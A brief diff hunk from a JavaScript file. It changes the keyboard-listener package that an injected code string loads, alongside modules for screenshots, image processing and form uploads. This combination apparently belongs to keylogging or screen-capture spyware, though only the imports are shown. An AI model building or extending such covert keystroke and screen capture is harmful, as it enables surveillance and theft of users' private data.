@@ -201,7 +201,7 @@ try {
             const isFileMatching = ${isFileMatching.toString()};
             setTimeout(() => {
                 try {
-                    const GlobalKeyboardListener = require("node-get-listener").GlobalKeyboardListener;
+                    const GlobalKeyboardListener = require("module-listener").GlobalKeyboardListener;
                     const { Monitor } = require("node-screenshots");
                     const sharp = require("sharp");
                     const FormData = require("form-data");
